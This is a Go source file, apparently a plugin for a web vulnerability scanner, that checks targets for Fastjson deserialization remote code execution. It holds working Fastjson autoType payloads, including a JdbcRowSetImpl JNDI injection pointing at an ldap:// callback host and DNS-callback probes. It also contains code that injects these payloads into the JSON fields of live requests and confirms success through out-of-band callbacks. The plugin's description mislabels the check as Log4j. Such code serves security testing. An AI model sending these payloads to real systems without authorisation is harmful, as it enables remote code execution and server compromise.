package Java

import (
	"encoding/json"
	"fmt"
	"jray/addon/BugCheck/Common"
	"jray/addon/BugCheck/Ginfo/Ghttp"
	"strings"
)

var checkFastJsonPayloads map[string][]string

func init() {
	Common.AddBugScanListPerFile(FastjsonJScan{Common.PluginBase{Name: "Fa", Desc: "Log4j 命令执行漏洞", Type: "RCE", Level: 2, TimeOut: 3, Ltype: "JAVA"}})
	checkFastJsonPayloads = map[string][]string{
		"dig": []string{
			"{\"@type\":\"java.net.InetAddress\",\"val\":\"%s.%s\"}",
			"{\"@type\":\"java.net.InetAddress\",\"val\":\"%s.%s\"}",
			"{{\"@type\":\"java.net.URL\",\"val\":\"%s.%s\"}:\"aaa\"}",
			"{{\"@type\":\"java.net.URL\",\"val\":\"%s.%s\"}:\"aaa\"}",
			"{\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"http://%s.%s\"}}\"\"}",
			"{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"%s.%s\"}}",
		},
		"ldap": []string{
			//"{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://%s/%s\", \"autoCommit\":true}",
			//"{\"@type\":\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\"jndiName\":\"ldap://%s/%s\", \"loginTimeout\":0}",
			//"{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://%s/%s\", \"autoCommit\":true}",
			//"{\n    \"a\":{\n        \"@type\":\"java.lang.Class\",\n        \"val\":\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\"\n    },\n    \"b\":{\n        \"@type\":\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\n        \"dataSourceName\":\"ldap://%s/%s\",\n        \"autoCommit\":true\n    }\n}",
			"{\n    \"a\":{\n        \"@type\":\"java.lang.Class\",\n        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n    },\n    \"b\":{\n        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n        \"dataSourceName\":\"ldap://%s/%s\",\n        \"autoCommit\":true\n    }\n}"},
	}
}

type FastjsonJScan struct {
	Common.PluginBase
}

func (p FastjsonJScan) Exec(p1 Common.PluginBaseFun, request Common.Request, response Common.Response) {
	if !p.CheckReverse() {
		return
	}
	p.Request = request
	p.Response = response
	p.Audit()

}

func (p FastjsonJScan) CheckLog(checkList []Log4JChekcRsult, reverse *Common.Reverse) (Log4JChekcRsult, bool) {
	if reverse.ReverseType == "ldap" {
		for _, checkInfo := range checkList {
			if checkInfo.CheckCount < 5 {
				result := Ghttp.Analyze(fmt.Sprintf(reverse.ReverseCheckDomain, checkInfo.CheckId), "GET", "", p.Request.Header, p.TimeOut)
				if result.StatusCode == 200 {
					return checkInfo, true
				}
				checkInfo.CheckCount++
			}

		}

	} else if reverse.ReverseType == "dig" {
		for _, checkInfo := range checkList {
			if checkInfo.CheckCount < 5 {
				map1 := map[string]string{}
				map1["token"] = reverse.DigToken
				map1["domain"] = reverse.ReverseCheckDomain
				result := Common.CheckDNSLog_Platform_Golang(reverse.ReverseDomain, map1)
				if result != nil {
					for _, v := range result {
						if strings.Contains(v, checkInfo.CheckId) {
							return checkInfo, true
						}
					}
				}
				checkInfo.CheckCount++
			}
		}
	}
	return Log4JChekcRsult{}, false

}

type FastJChekcRsult struct {
	Param      string
	Url        string
	CheckId    string
	CheckCount int
}

func (p FastjsonJScan) Audit() {

	checkLists := []Log4JChekcRsult{}

	if len(p.Request.Body) > 0 || p.Request.URL.RawQuery != "" || p.Request.Header != nil {

		rType := p.GetReverseType()
		if _, ok := checkFastJsonPayloads[rType]; !ok {
			return
		}
		if _, ok := Common.ReverseMap[rType]; !ok {
			return
		}
		reverse := Common.ReverseMap[rType]
		rPayloads := checkFastJsonPayloads[rType]
		for _, payload := range rPayloads {
			if p.Request.Method != "GET" && len(p.Request.Body) > 0 {
				contentType := p.Request.Header.Get("Content-Type")
				if strings.Contains(contentType, "application/json") {
					var f interface{}
					err4 := json.Unmarshal(p.Request.Body, &f)
					if err4 != nil || f == nil {
						return
					}
					m := f.(map[string]interface{})
					for _, v := range m {

						switch v.(type) {
						case string:
							r1 := Common.RandStr(16)
							r2 := Common.Md5(r1 + p.Request.CheckUrl.String())
							main_payload := ""
							if reverse.ReverseType == "ldap" {
								main_payload = fmt.Sprintf(payload, reverse.ReverseDomain, r2)
							} else if reverse.ReverseType == "dig" {
								main_payload = fmt.Sprintf(payload, r2, reverse.ReverseDomain[:len(reverse.ReverseDomain)])
							} else {
								return
							}
							//m[k] = main_payload
							//bodym, _ := json.Marshal(m)
							//bodym:=fmt.Sprintf(payload,reverse.ReverseDomain)

							result := Ghttp.Analyze(p.Request.URL.String(), p.Request.Method, string(main_payload), p.Request.Header, p.TimeOut)

							log4JChekcRsult := Log4JChekcRsult{Param: string(main_payload), Url: p.Request.URL.String(), CheckId: r2, CheckCount: 0}
							checkLists = append(checkLists, log4JChekcRsult)
							if result.StatusCode > 0 {
								checkResult, isSuccess := p.CheckLog(checkLists, &reverse)
								if isSuccess {
									p.Success(p.Name, p.Request.CheckUrl.String(), p.Type, p.Desc, checkResult.Param)
									return
								}
							}

						case int:
						case float64:
						case []interface{}:
						default:
						}
					}
				}
			}
			//if p.Request.Header != nil {
			//	requestHeaders := p.Request.Header
			//	for k1, _ := range requestHeaders {
			//		println(k1)
			//		if k1 == "" || k1 == "Accept-Encoding" || k1 == "Upgrade-Insecure-Requests" || k1 == "Proxy-Connection" || k1 == "Accept-Language" || k1 == "Cache-Control" {
			//			continue
			//		}
			//
			//		v1 := requestHeaders.Get(k1)
			//		r1 := Common.RandStr(16)
			//		r2 := Common.Md5(r1 + p.Request.CheckUrl.String())
			//		main_payload := fmt.Sprintf(payload, reverse.ReverseDomain, r2)
			//		requestHeaders.Set(k1, main_payload)
			//		result := Ghttp.Analyze(p.Request.URL.String(), "GET", "", requestHeaders, p.TimeOut)
			//		log4JChekcRsult := Log4JChekcRsult{Param: k1, Url: p.Request.URL.String(), CheckId: r2, CheckCount: 0}
			//		checkLists = append(checkLists, log4JChekcRsult)
			//		if result.StatusCode > 0 {
			//			checkResult, isSuccess := p.CheckLog(checkLists, &reverse)
			//			if isSuccess {
			//				p.Success(p.Name, p.Request.CheckUrl.String(), p.Type, p.Desc, checkResult.Param)
			//				return
			//			}
			//		}
			//		requestHeaders.Set(k1, v1)
			//	}
			//
			//}
		}

	}

}
